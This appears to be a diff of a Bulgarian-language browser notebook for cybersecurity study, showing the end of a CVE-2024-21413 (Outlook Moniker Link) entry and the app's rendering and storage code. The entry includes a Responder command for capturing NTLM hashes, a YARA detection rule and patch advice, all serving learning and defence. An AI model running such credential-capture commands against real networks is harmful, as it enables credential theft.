+        { type: "paragraph", text: "Responder може да слуша за SMB authentication опити. В примерната конфигурация е използван интерфейсът ens5; името на интерфейса зависи от конкретната машина. Като алтернатива може да се използва SMB server от Impacket." },
+        { type: "code", language: "Shell · лабораторен пример", text: `responder -I ens5` },
+        { type: "paragraph", text: "В Wireshark SMB заявката се вижда като Session Setup с NTLMSSP. Приложената packet capture снимка показва прекъснат NTLM response; потребителското име и домейнът са елементи от показания учебен трафик." },
+        { type: "image", src: "images/wireshark-netntlmv2-capture.png", alt: "Wireshark пакет с SMB Session Setup и прекъснат NTLMv2 response", caption: "Wireshark: SMB Session Setup / NTLMSSP. Отговорът е съкратен в заснетия пример." },
+        { type: "heading", text: "Откриване с YARA" },
+        { type: "paragraph", text: "Florian Roth е създал YARA rule за откриване на имейли, съдържащи file:// елемент в Moniker Link, който може да е признак за опит за експлоатация." },
+        { type: "code", language: "YARA", text: String.raw`rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
+   meta:
+      description = "Открива имейли с признаци за опит за експлоатация на CVE-2024-21413 в Microsoft Outlook"
+      author = "X__Junior, Florian Roth"
+      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
+      date = "2024-02-17"
+      modified = "2024-02-19"
+      score = 75
+
+   strings:
+      $a1 = "Subject: "
+      $a2 = "Received: "
+      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/
+
+   condition:
+      filesize < 1000KB
+      and all of ($a*)
+      and 1 of ($xr*)
+}` },
+        { type: "heading", text: "Корекции и препоръки за защита" },
+        { type: "paragraph", text: "Microsoft включва корекции в изданието Patch Tuesday от февруари 2024 г. Препоръчва се Office да бъде актуализиран чрез Windows Update или Microsoft Update Catalog. В MSRC update guide са посочени съответните KB статии и build версии." },
+        { type: "list", items: [
+          "Не отваряй случайни линкове, особено в непоискани имейли.",
+          "Преглеждай адреса на линка, преди да го отвориш.",
+          "Препращай съмнителни имейли до отговорния екип по киберсигурност.",
+          "Инсталирай наличните актуализации за Office."
+        ] },
+        { type: "paragraph", text: "Според предоставения материал няма настройка в Outlook, която сама по себе си да предотврати конкретното заобикаляне на Protected View. Пълното блокиране на SMB може да попречи на достъпа до мрежови споделяния. Организациите могат да преценят филтриране на SMB на firewall ниво според собствената си среда." },
+        { type: "heading", text: "Източници и допълнителни материали" },
+        { type: "links", items: [
+          { label: "CVE Record — CVE-2024-21413", url: "https://www.cve.org/CVERecord?id=CVE-2024-21413" },
+          { label: "Check Point Research — анализ на Moniker Link", url: "https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/" },
+          { label: "Microsoft Security Response Center — advisory и засегнати версии", url: "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413" },
+          { label: "Microsoft Learn — URL Monikers", url: "https://learn.microsoft.com/en-us/windows/win32/com/url-monikers" },
+          { label: "GitHub — CMNatic PoC", url: "https://github.com/CMNatic/CVE-2024-21413" },
+          { label: "YARA rule — signature-base", url: "https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar" },
+          { label: "Microsoft Update Catalog", url: "https://www.catalog.update.microsoft.com/Home.aspx" },
+          { label: "Допълнителна GitHub препратка от YARA rule", url: "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/" }
+        ] }
+      ]
+    }, ...(window.METASPLOIT_ENTRIES || [])];
+    const STORAGE_KEY = "cybersecurity-notebook-v1";
+    const TYPE_LABELS = { note: "Бележка", command: "Команда", post: "Публикация", cve: "CVE" };
+    const TYPE_ICONS = { note: "▧", command: "⌘", post: "▤", cve: "⌕" };
+    let entries = loadEntries();
+    let currentPage = "home";
+    let activeTab = "overview";
+    let searchQuery = "";
+    let editingId = null;
+    let toastTimer;
+    let imageViewerPosition = { x: 0, y: 0, trigger: null, bodyStyles: null, htmlOverflow: "" };
+
+    function loadEntries() {
+      let saved = [];
+      try { saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]"); } catch { saved = []; }
+      const byId = new Map(saved.map(item => [item.id, item]));
+      CHAT_ENTRIES.forEach(item => byId.set(item.id, { ...byId.get(item.id), ...item }));
+      const merged = [...byId.values()];
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(merged));
+      return merged;
+    }
+    function saveEntries() { localStorage.setItem(STORAGE_KEY, JSON.stringify(entries)); render(); }
+    function slug(value) { return String(value || "").trim().toLocaleLowerCase("bg").normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") || "tema"; }
+    function escapeHtml(value) { return String(value ?? "").replace(/[&<>"']/g, ch => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[ch]); }
+    function safeUrl(value) { try { const url = new URL(value); return ["http:", "https:"].includes(url.protocol) ? url.href : ""; } catch { return ""; } }
+    function inlineFormat(value) { return escapeHtml(value).replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>"); }
+    function codeTheme(language) {
+      const name = String(language || "").toLocaleLowerCase("bg");
+      if (/yara/.test(name)) return "yara";
+      if (/powershell|windows|win32|cmd(?:\.exe)?|command prompt|batch/.test(name)) return "windows";
+      if (/linux|shell|bash|zsh|terminal|responder/.test(name)) return "linux";
+      if (/python|\bpy\b/.test(name)) return "python";
+      if (/html|xml/.test(name)) return "markup";
+      if (/javascript|typescript|node\.js/.test(name)) return "javascript";
+      if (/sql/.test(name)) return "sql";
+      return "default";
+    }
+    function highlightCode(source, language) {
+      const theme = codeTheme(language);
+      const keywords = {
+        python: /^(?:and|as|assert|async|await|break|class|continue|def|del|elif|else|except|False|finally|for|from|global|if|import|in|is|lambda|None|nonlocal|not|or|pass|raise|return|True|try|while|with|yield)$/,
+        markup: /^(?:DOCTYPE|html|head|body|p|a|div|span|script|style|link|meta|table|tr|td|th)$/i,
+        yara: /^(?:rule|meta|strings|string|condition|all|any|of|them|and|or|not|true|false|filesize|contains|startswith|endswith|matches|at|in)$/i,
+        linux: /^(?:sudo|cd|ls|cat|pwd|whoami|id|ip|ifconfig|nmap|responder|python3?|curl|wget|grep|find|chmod|chown|ssh|scp|nc|netcat|ping|systemctl|apt|dnf|yum)$/i,
+        windows: /^(?:if|else|elseif|foreach|for|function|return|try|catch|finally|Get-[A-Za-z-]+|Set-[A-Za-z-]+|New-[A-Za-z-]+|Remove-[A-Za-z-]+|Write-Host|Write-Output|Select-Object|Where-Object|Import-Module)$/i,
+        javascript: /^(?:async|await|break|case|catch|class|const|continue|default|delete|do|else|export|extends|false|finally|for|from|function|if|import|in|instanceof|let|new|null|of|return|static|super|switch|this|throw|true|try|typeof|undefined|var|void|while|yield)$/,
+        sql: /^(?:select|from|where|join|inner|left|right|outer|on|as|insert|into|values|update|set|delete|create|table|drop|alter|and|or|not|null|like|in|order|by|group|having|limit|distinct|primary|key)$/i
+      }[theme];
+      const tokenPattern = /#[^\n]*|\/\/[^\n]*|\/\*[\s\S]*?\*\/|<!--[\s\S]*?-->|"""[\s\S]*?"""|'''[\s\S]*?'''|"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`|<\/?[A-Za-z][\w:-]*|\/?>(?!\s*\w)|[A-Za-z_:][\w:.-]*(?=\s*=)|--?[A-Za-z][\w-]*|[$@][A-Za-z_][\w:]*|(?:0[xX][\da-fA-F]+|\b\d+(?:\.\d+)?(?:KB|MB)?\b)|[A-Za-z_][A-Za-z0-9_.-]*|===|!==|==|!=|<=|>=|=>|->|:=|&&|\|\||[=+*\/%<>!&|:-]/gm;
+      let result = "";
+      let cursor = 0;
+      let match;
+      while ((match = tokenPattern.exec(String(source ?? ""))) !== null) {
+        const text = match[0];
+        const start = match.index;
+        const raw = String(source ?? "");
+        result += escapeHtml(raw.slice(cursor, start));
+        let kind = "";
+        if (/^(?:#|\/\/|\/\*|<!--)/.test(text)) kind = "comment";
+        else if (/^(?:\"|')/.test(text) || text.startsWith("`")) kind = "string";
+        else if (theme === "markup" && (text.startsWith("<") || text === ">" || text === "/>")) kind = "tag";
+        else if (theme === "markup" && /^[A-Za-z_:]/.test(text) && /^\s*=/.test(raw.slice(start + text.length))) kind = "attribute";
+        else if (/^(?:[$@]|--?\w)/.test(text)) kind = theme === "linux" && text.startsWith("-") ? "operator" : "variable";
+        else if (/^(?:0[xX][\da-fA-F]+|\d)/.test(text)) kind = "number";
+        else if (keywords && keywords.test(text)) kind = "keyword";
+        else if (/^[A-Za-z_][A-Za-z0-9_.-]*$/.test(text)) {
+          const lineStart = raw.lastIndexOf("\n", start - 1) + 1;
+          const atLineStart = /^\s*$/.test(raw.slice(lineStart, start));
+          if (/^\s*\(/.test(raw.slice(start + text.length)) || (theme === "linux" && atLineStart)) kind = "function";
+        }
+        else if (/^(?:===|!==|==|!=|<=|>=|=>|->|:=|&&|\|\||[=+*\/%<>!&|:-])/.test(text)) kind = "operator";
+        result += kind ? `<span class="tok-${kind}">${escapeHtml(text)}</span>` : escapeHtml(text);
+        cursor = tokenPattern.lastIndex;
+      }
+      result += escapeHtml(String(source ?? "").slice(cursor));
+      return result;
+    }
+    function renderBlocks(blocks) {
+      return blocks.map(block => {
+        if (block.type === "heading") return `<h4>${escapeHtml(block.text)}</h4>`;
+        if (block.type === "paragraph") return `<p>${inlineFormat(block.text)}</p>`;
+        if (block.type === "list") { const tag = block.ordered ? "ol" : "ul"; return `<${tag}>${(block.items || []).map(item => `<li>${inlineFormat(item)}</li>`).join("")}</${tag}>`; }
+        if (block.type === "table") return `<div class="table-scroll"><table><thead><tr>${(block.headers || []).map(cell => `<th>${inlineFormat(cell)}</th>`).join("")}</tr></thead><tbody>${(block.rows || []).map(row => `<tr>${row.map(cell => `<td>${inlineFormat(cell)}</td>`).join("")}</tr>`).join("")}</tbody></table></div>`;
+        if (block.type === "code") return `<div class="code-block theme-${codeTheme(block.language)}"><div class="code-label">${escapeHtml(block.language || "код")}</div><pre><code>${highlightCode(block.text, block.language)}</code></pre></div>`;
+        if (block.type === "image") { const src = String(block.src || ""); const safeLocal = /^images\/[a-z0-9._/-]+$/i.test(src) && !src.split("/").includes(".."); return safeLocal ? `<figure class="note-figure"><button type="button" class="image-preview" data-image-preview="${escapeHtml(src)}" data-image-alt="${escapeHtml(block.alt || "")}" data-image-caption="${escapeHtml(block.caption || "")}" aria-label="Отвори изображението в пълен размер"><img src="${escapeHtml(src)}" alt="${escapeHtml(block.alt || "")}" loading="lazy"></button><figcaption>${escapeHtml(block.caption || "")}</figcaption></figure>` : ""; }
+        if (block.type === "links") return `<ul class="resource-list">${(block.items || []).map(item => { const href = safeUrl(item.url); return href ? `<li><a href="${escapeHtml(href)}" target="_blank" rel="noopener noreferrer">${escapeHtml(item.label || href)} ↗</a></li>` : ""; }).join("")}</ul>`;
+        return "";
+      }).join("");
+    }
+    function niceTopic(value) { return value || "Общи"; }
+    function isCve(entry) { return entry.type === "cve" || /^CVE-\d{4}-\d{4,}$/i.test(entry.title || ""); }
+    function cveId(entry) { const match = (entry.title || "").match(/CVE-\d{4}-\d{4,}/i); return match ? match[0].toUpperCase() : entry.title; }
+    function entrySearchText(item) {
+      const details = (item.blocks || []).map(block => [block.text, (block.items || []).map(value => typeof value === "string" ? value : `${value.label || ""} ${value.url || ""}`).join(" "), (block.headers || []).join(" "), (block.rows || []).flat().join(" ")].join(" ")).join(" ");
+      return [item.title, item.content, item.topic, item.sourceName, item.url, details].join(" ").toLocaleLowerCase("bg");
+    }
+    function filtered(list) {
+      const query = searchQuery.trim().toLocaleLowerCase("bg");
+      return list.filter(item => !query || entrySearchText(item).includes(query));
+    }
+    function countForTopic(topic) { return entries.filter(item => !isCve(item) && (item.topic || "").toLocaleLowerCase("bg") === topic.toLocaleLowerCase("bg")).length; }
+    function syncSidebar() {
+      const metasploit = entries.filter(item => !isCve(item) && (item.topic || "").toLocaleLowerCase("bg") === "metasploit");
+      document.getElementById("metasploit-count").textContent = metasploit.length;
+      document.getElementById("cve-count").textContent = entries.filter(isCve).length;
+      document.getElementById("posts-count").textContent = entries.filter(item => item.type === "post").length;
+      document.getElementById("notes-count").textContent = entries.filter(item => !isCve(item)).length;
+      const cves = [...new Map(entries.filter(isCve).map(item => [cveId(item), item])).values()];
+      document.getElementById("cve-subnav").innerHTML = cves.map(item => `<button class="subnav-button" data-page="cve:${encodeURIComponent(cveId(item))}">${escapeHtml(cveId(item))}</button>`).join("");
+      document.querySelectorAll("[data-page]").forEach(button => button.classList.toggle("active", button.dataset.page === currentPage || (currentPage.startsWith("topic:metasploit:") && button.dataset.page === "topic:metasploit") || (currentPage.startsWith("cve:") && button.dataset.page === "cves")));
+      document.querySelectorAll("[data-page]").forEach(button => button.onclick = () => { currentPage = button.dataset.page; searchQuery = ""; document.getElementById("search").value = ""; document.getElementById("sidebar").classList.remove("open"); render(); });
+    }
+    function noteCard(item) {
+      const link = safeUrl(item.url);
+      const meta = [TYPE_LABELS[item.type] || TYPE_LABELS.note, item.topic && !isCve(item) ? item.topic : "", item.sourceName || "", item.createdAt || ""].filter(Boolean);
+      const body = Array.isArray(item.blocks) ? renderBlocks(item.blocks) : `<p>${escapeHtml(item.content)}</p>`;
+      return `<article class="note-card"><div class="note-top"><h3>${escapeHtml(item.title)}</h3><div class="note-actions"><button class="icon-button" data-edit="${escapeHtml(item.id)}" aria-label="Редактирай">Редактирай</button><button class="icon-button delete" data-delete="${escapeHtml(item.id)}" aria-label="Изтрий">Изтрий</button></div></div><div class="note-body">${body}</div><div class="note-meta">${meta.map(label => `<span class="pill">${escapeHtml(label)}</span>`).join("")}${link ? `<a class="note-source" href="${escapeHtml(link)}" target="_blank" rel="noopener noreferrer">Отвори източника ↗</a>` : ""}</div></article>`;
+    }
+    function listMarkup(list, emptyTitle, emptyCopy) {
+      const items = filtered(list);
+      if (!items.length) return `<div class="empty-state"><div class="empty-icon">⌘</div><h3>${searchQuery ? "Няма намерени резултати" : escapeHtml(emptyTitle)}</h3><p>${searchQuery ? "Промени думата за търсене или избери друг раздел." : escapeHtml(emptyCopy)}</p>${searchQuery ? "" : `<button class="primary-button" data-add-here><span>＋</span> Добави материал</button>`}</div>`;
+      return `<div class="note-list">${items.map(noteCard).join("")}</div>`;
+    }
+    function topicTabs() {
+      return `<div class="tabs" role="tablist"><button class="tab-button ${activeTab === "overview" ? "active" : ""}" data-tab="overview">Представлява</button><button class="tab-button ${activeTab === "commands" ? "active" : ""}" data-tab="commands">Команди</button><button class="tab-button ${activeTab === "posts" ? "active" : ""}" data-tab="posts">Публикации</button></div>`;
+    }
+    function homePage() {
+      const topics = new Map();
+      entries.filter(item => !isCve(item)).forEach(item => { const topic = niceTopic(item.topic); topics.set(topic, (topics.get(topic) || 0) + 1); });
+      const cards = [{ name: "Metasploit", count: countForTopic("Metasploit"), icon: "◈", desc: "Обяснения, команди и публикации за Metasploit." }, ...[...topics.keys()].filter(name => name.toLocaleLowerCase("bg") !== "metasploit").map(name => ({ name, count: topics.get(name), icon: "◌", desc: `Събрани бележки и материали по ${name}.` }))];
+      const totalCves = entries.filter(isCve).length;
+      return `<section class="hero"><div class="eyebrow">ТВОЯТ ЛИЧЕН КИБЕР ДНЕВНИК</div><h1>Учи. Подреждай.<br>Връщай се към важното.</h1><p class="hero-copy">Едно място за знания от TryHackMe, YouTube, Reddit, X и други източници. Изпращай ми материалите в чата — ще ги превеждам на български и ще ги добавям в правилния раздел.</p><div class="hero-footer"><span class="pulse"></span> Работи локално в браузъра ти <span>·</span> Няма нужда от акаунт</div></section>
+      <section class="stats"><div class="stat-card"><div class="stat-value">${entries.length}</div><div class="stat-label">запазени материала</div></div><div class="stat-card"><div class="stat-value">${topics.size + (topics.has("Metasploit") ? 0 : 1)}</div><div class="stat-label">теми</div></div><div class="stat-card"><div class="stat-value">${totalCves}</div><div class="stat-label">CVE записа</div></div></section>
+      <section><div class="section-heading"><div><h2>Теми</h2><p>Избери тема, за да разгледаш подредените материали.</p></div></div><div class="topic-grid">${cards.map(card => `<button class="topic-card" data-open-topic="${escapeHtml(card.name)}"><div class="topic-card-top"><span class="topic-symbol">${card.icon}</span><span class="topic-arrow">↗</span></div><h3>${escapeHtml(card.name)}</h3><p>${escapeHtml(card.desc)}</p><div class="topic-meta"><span>${card.count} материала</span><span>Отвори тема</span></div></button>`).join("")}<button class="topic-card" data-page="cves"><div class="topic-card-top"><span class="topic-symbol">⌕</span><span class="topic-arrow">↗</span></div><h3>CVE</h3><p>Уязвимости, описания и полезни препратки.</p><div class="topic-meta"><span>${totalCves} CVE записа</span><span>Отвори раздел</span></div></button></div></section>`;
+    }
+    function cvePage() {
+      const unique = [...new Map(entries.filter(isCve).map(item => [cveId(item), item])).values()].sort((a, b) => cveId(a).localeCompare(cveId(b)));
+      const cards = filtered(unique);
+      const body = cards.length ? `<div class="cve-list">${cards.map(item => `<button class="cve-item" data-page="cve:${encodeURIComponent(cveId(item))}"><div class="cve-id">${escapeHtml(cveId(item))}</div><div class="cve-summary">${escapeHtml((item.content || "Няма добавено описание.").slice(0, 130))}</div><div class="cve-meta">Отвори записа →</div></button>`).join("")}</div>` : `<div class="empty-state"><div class="empty-icon">⌕</div><h3>${searchQuery ? "Няма намерени CVE записи" : "Все още няма CVE записи"}</h3><p>${searchQuery ? "Промени думата за търсене." : "Когато ми изпратиш информация за CVE, ще добавя отделен подтаб за него тук."}</p>${searchQuery ? "" : `<button class="primary-button" data-add-cve><span>＋</span> Добави CVE</button>`}</div>`;
+      return `<div class="page-head"><div class="eyebrow">БАЗА ЗНАНИЯ</div><h1>CVE</h1><p>Всеки CVE има собствен подтаб с описание, бележки и линкове към източника.</p></div><div class="content-toolbar"><p>${unique.length} записа</p><button class="primary-button" data-add-cve><span>＋</span> Добави CVE</button></div>${body}`;
+    }
+    function render() {
+      syncSidebar();
+      const content = document.getElementById("content");
+      let html = "";
+      let breadcrumb = "Начало";
+      if (currentPage === "home") html = homePage();
+      else if (currentPage.startsWith("topic:")) {
+        const parts = currentPage.split(":"); const topic = parts[1] || "Metasploit";
+        if (topic.toLocaleLowerCase("bg") === "metasploit") {
+          activeTab = parts[2] || "overview";
+          breadcrumb = `Metasploit${activeTab !== "overview" ? " / " + ({ commands: "Команди", posts: "Публикации" }[activeTab] || "Представлява") : ""}`;
+          const type = activeTab === "commands" ? "command" : activeTab === "posts" ? "post" : "note";
+          const list = entries.filter(item => !isCve(item) && (item.topic || "").toLocaleLowerCase("bg") === "metasploit" && (item.type === type || (activeTab === "overview" && !["command", "post"].includes(item.type))));
+          const titles = { overview: ["Тук ще събираме информация за Metasploit.", "Изпрати ми обяснение или учебна бележка за Metasploit — ще я преведа на български и ще я подредя тук."], commands: ["Все още няма команди.", "Когато ми изпратиш команда, ще я добавя тук с обяснение на български, като запазя синтаксиса ѝ."], posts: ["Все още няма публикации.", "Статии, видеа и постове за Metasploit ще се събират в този раздел с линк към оригиналния източник."] };
+          html = `<div class="page-head"><div class="eyebrow">ТЕМА</div><h1>Metasploit</h1><p>Материалите са разделени по тип, за да намираш лесно обясненията, командите и публикациите.</p></div>${topicTabs()}<div class="content-toolbar"><p>${list.length} ${TYPE_LABELS[type].toLocaleLowerCase("bg")}</p><button class="primary-button" data-add-topic="Metasploit" data-add-type="${type}"><span>＋</span> Добави материал</button></div>${listMarkup(list, titles[activeTab][0], titles[activeTab][1])}`;
+        } else {
+          breadcrumb = topic;
+          const list = entries.filter(item => !isCve(item) && (item.topic || "").toLocaleLowerCase("bg") === topic.toLocaleLowerCase("bg"));
+          html = `<div class="page-head"><div class="eyebrow">ТЕМА</div><h1>${escapeHtml(topic)}</h1><p>Бележки, команди и публикации по тази тема.</p></div><div class="content-toolbar"><p>${list.length} материала</p><button class="primary-button" data-add-topic="${escapeHtml(topic)}"><span>＋</span> Добави материал</button></div>${listMarkup(list, "Тук още няма материали.", `Изпрати ми информация за ${topic} и ще я добавя в този раздел.`)}`;
+        }
+      } else if (currentPage === "cves") { breadcrumb = "CVE"; html = cvePage(); }
+      else if (currentPage.startsWith("cve:")) {
+        const id = decodeURIComponent(currentPage.slice(4)); breadcrumb = `CVE / ${id}`;
+        const item = entries.find(entry => isCve(entry) && cveId(entry) === id);
+        html = `<div class="page-head"><div class="eyebrow">УЯЗВИМОСТ</div><h1>${escapeHtml(id)}</h1><p>Бележки и източници, събрани за този CVE.</p></div><div class="content-toolbar"><p>Индивидуален CVE запис</p><button class="primary-button" data-edit="${escapeHtml(item?.id || "")}"><span>＋</span> Допълни записа</button></div>${item ? listMarkup([item], "", "") : `<div class="empty-state"><h3>Този CVE запис липсва.</h3><p>Добави информация, за да създадеш записа.</p><button class="primary-button" data-add-cve>＋ Добави CVE</button></div>`}`;
+      } else if (currentPage === "all-posts") {
+        breadcrumb = "Всички публикации"; const list = entries.filter(item => item.type === "post");
+        html = `<div class="page-head"><div class="eyebrow">ИЗТОЧНИЦИ</div><h1>Всички публикации</h1><p>Статии, видеа и постове от различни платформи, подредени по тема.</p></div>${listMarkup(list, "Все още няма публикации.", "Изпрати ми статия, видео или пост; ще добавя записа към темата и ще запазя източника.")}`;
+      } else {
+        breadcrumb = "Всички бележки"; const list = entries.filter(item => !isCve(item));
+        html = `<div class="page-head"><div class="eyebrow">БИБЛИОТЕКА</div><h1>Всички бележки</h1><p>Обяснения и команди от всички теми на едно място.</p></div>${listMarkup(list, "Бележникът още е празен.", "Когато ми изпратиш учебна информация в чата, ще я преведа и подредя тук.")}`;
+      }
+      document.getElementById("breadcrumb").innerHTML = escapeHtml(breadcrumb);
+      content.innerHTML = html;
+      content.querySelectorAll("[data-tab]").forEach(button => button.onclick = () => { activeTab = button.dataset.tab; currentPage = `topic:metasploit:${activeTab}`; render(); });
+      content.querySelectorAll("[data-open-topic]").forEach(button => button.onclick = () => { const topic = button.dataset.openTopic; currentPage = `topic:${topic}${topic.toLocaleLowerCase("bg") === "metasploit" ? ":overview" : ""}`; activeTab = "overview"; render(); });
+      content.querySelectorAll("[data-add-here]").forEach(button => button.onclick = () => openDialog());
+      content.querySelectorAll("[data-add-topic]").forEach(button => button.onclick = () => openDialog(null, { topic: button.dataset.addTopic, type: button.dataset.addType || "note" }));
+      content.querySelectorAll("[data-add-cve]").forEach(button => button.onclick = () => openDialog(null, { type: "cve", topic: "CVE" }));
+      content.querySelectorAll("[data-page]").forEach(button => button.onclick = () => { currentPage = button.dataset.page; render(); });
+      content.querySelectorAll("[data-edit]").forEach(button => button.onclick = () => { const item = entries.find(entry => entry.id === button.dataset.edit); if (item) openDialog(item); else openDialog(null, { type: "cve", topic: "CVE" }); });
+      content.querySelectorAll("[data-delete]").forEach(button => button.onclick = () => deleteEntry(button.dataset.delete));
+      content.querySelectorAll("[data-image-preview]").forEach(button => button.onclick = () => {
+        const viewer = document.getElementById("image-viewer");
+        const image = document.getElementById("image-viewer-image");
+        const body = document.body;
+        imageViewerPosition = {
+          x: window.scrollX,
+          y: window.scrollY,
+          trigger: button,
+          bodyStyles: { position: body.style.position, top: body.style.top, left: body.style.left, width: body.style.width, overflow: body.style.overflow },
+          htmlOverflow: document.documentElement.style.overflow
+        };
+        body.style.position = "fixed";
+        body.style.top = `${-imageViewerPosition.y}px`;
+        body.style.left = `${-imageViewerPosition.x}px`;
+        body.style.width = "100%";
+        body.style.overflow = "hidden";
+        document.documentElement.style.overflow = "hidden";
+        image.src = button.dataset.imagePreview;
+        image.alt = button.dataset.imageAlt || "";
+        document.getElementById("image-viewer-caption").textContent = button.dataset.imageCaption || "";
+        viewer.showModal();
+        document.getElementById("image-viewer-close").focus({ preventScroll: true });
+      });
+    }
+    function openDialog(item = null, defaults = {}) {
+      editingId = item?.id || null;
+      const form = document.getElementById("entry-form"); form.reset();
+      document.getElementById("dialog-title").textContent = item ? "Редактирай бележка" : "Нова бележка";
+      form.elements.title.value = item?.title || "";
+      form.elements.type.value = item?.type || defaults.type || "note";
+      form.elements.topic.value = item?.topic || defaults.topic || "Metasploit";
+      form.elements.sourceName.value = item?.sourceName || "";
+      form.elements.url.value = item?.url || "";
+      form.elements.content.value = item?.content || "";
+      document.getElementById("entry-dialog").showModal();
+      setTopicVisibility();
+    }
+    function setTopicVisibility() { const isCveType = document.getElementById("entry-type").value === "cve"; document.getElementById("topic-field").hidden = isCveType; if (isCveType) document.getElementById("entry-topic").value = "CVE"; }
+    function deleteEntry(id) { if (!confirm("Да изтрия ли тази бележка?")) return; entries = entries.filter(item => item.id !== id); saveEntries(); showToast("Бележката е изтрита."); }
+    function showToast(message) { const toast = document.getElementById("toast"); toast.textContent = message; toast.classList.add("show"); clearTimeout(toastTimer); toastTimer = setTimeout(() => toast.classList.remove("show"), 2500); }
+
+    document.getElementById("add-button").onclick = () => openDialog();
+    document.getElementById("close-dialog").onclick = document.getElementById("cancel-dialog").onclick = () => document.getElementById("entry-dialog").close();
+    document.getElementById("image-viewer-close").onclick = () => document.getElementById("image-viewer").close();
+    document.getElementById("image-viewer").onclick = event => { if (event.target === event.currentTarget) event.currentTarget.close(); };
+    document.getElementById("image-viewer").addEventListener("close", () => {
+      const { x, y, trigger, bodyStyles, htmlOverflow } = imageViewerPosition;
+      if (bodyStyles) {
+        const body = document.body;
+        body.style.position = bodyStyles.position;
+        body.style.top = bodyStyles.top;
+        body.style.left = bodyStyles.left;
+        body.style.width = bodyStyles.width;
+        body.style.overflow = bodyStyles.overflow;
+        document.documentElement.style.overflow = htmlOverflow;
+      }
+      if (trigger?.isConnected) trigger.focus({ preventScroll: true });
+      requestAnimationFrame(() => window.scrollTo(x, y));
+      setTimeout(() => window.scrollTo(x, y), 0);
+    });
+    document.getElementById("entry-type").onchange = setTopicVisibility;
+    document.getElementById("entry-form").onsubmit = event => {
+      event.preventDefault(); const form = event.currentTarget; const type = form.elements.type.value;
+      const title = form.elements.title.value.trim();
+      const item = { id: editingId || `entry-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`, title, type, topic: type === "cve" ? "CVE" : (form.elements.topic.value.trim() || "Общи"), sourceName: form.elements.sourceName.value, url: safeUrl(form.elements.url.value.trim()), content: form.elements.content.value.trim(), createdAt: new Date().toLocaleDateString("bg-BG") };
+      if (type === "cve" && !/^CVE-\d{4}-\d{4,}$/i.test(title)) { alert("За CVE заглавието използвай формат CVE-ГГГГ-номер, например CVE-2024-21413."); return; }
+      if (editingId) entries = entries.map(entry => entry.id === editingId ? { ...entry, ...item } : entry); else entries.unshift(item);
+      saveEntries(); document.getElementById("entry-dialog").close(); showToast(editingId ? "Промените са запазени." : "Материалът е добавен.");
+    };
+    document.getElementById("search").oninput = event => { searchQuery = event.target.value; render(); };
+    document.getElementById("mobile-menu").onclick = () => document.getElementById("sidebar").classList.toggle("open");
+    document.getElementById("export-button").onclick = () => { const blob = new Blob([JSON.stringify(entries, null, 2)], { type: "application/json" }); const link = document.createElement("a"); link.href = URL.createObjectURL(blob); link.download = "cybersecurity-notebook-backup.json"; link.click(); URL.revokeObjectURL(link.href); };
+    document.getElementById("import-button").onclick = () => document.getElementById("import-file").click();
+    document.getElementById("import-file").onchange = async event => { const file = event.target.files[0]; if (!file) return; try { const imported = JSON.parse(await file.text()); if (!Array.isArray(imported) || imported.some(item => !item.title || !item.content)) throw new Error("format"); const byId = new Map(entries.map(item => [item.id, item])); imported.forEach(item => byId.set(item.id || `import-${Math.random()}`, item)); entries = [...byId.values()]; saveEntries(); showToast("Резервното копие е импортирано."); } catch { alert("Файлът не е валидно резервно копие на бележника."); } event.target.value = ""; };
+    render();
+  </script>
+</body>
+</html>
